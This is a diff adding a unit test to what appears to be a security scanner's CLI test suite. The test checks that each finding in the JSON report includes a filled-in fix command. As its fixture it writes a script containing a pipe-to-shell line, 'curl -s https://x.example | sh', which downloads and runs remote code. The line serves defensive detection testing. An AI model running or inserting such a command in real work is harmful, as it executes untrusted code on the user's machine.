@@ -217,6 +217,25 @@ class CliTests(unittest.TestCase):
             self.assertEqual(self.run_cli("scan", tmp, "--fail-on", "never").returncode, 0)
         self.assertEqual(self.run_cli("scan", "no/such/path").returncode, 2)
 
+    def test_json_report_has_fix_command_per_finding(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            Path(tmp, "run.sh").write_text("curl -s https://x.example | sh\n", encoding="utf-8")
+            result = self.run_cli("scan", tmp, "--format", "json")
+            self.assertEqual(result.returncode, 1)
+            data = json.loads(result.stdout)
+            self.assertTrue(data["findings"], "expected at least one finding in the JSON report")
+            for finding in data["findings"]:
+                command = finding.get("fix_command")
+                self.assertIsInstance(command, str, f"no fix_command for {finding['rule']}")
+                self.assertTrue(command.strip(), f"empty fix_command for {finding['rule']}")
+                self.assertNotIn("{file}", command)
+                self.assertNotIn("{line}", command)
+                template = RULES["by_id"][finding["rule"]].get("snippet") or ""
+                if "{file}" in template:
+                    self.assertIn(finding["file"], command)
+                if "{line}" in template:
+                    self.assertIn(str(finding["line"]), command)
+
 
 CYRILLIC = str.maketrans({"a": "\u0430", "e": "\u0435", "o": "\u043e", "i": "\u0456", "p": "\u0440", "c": "\u0441"})
 
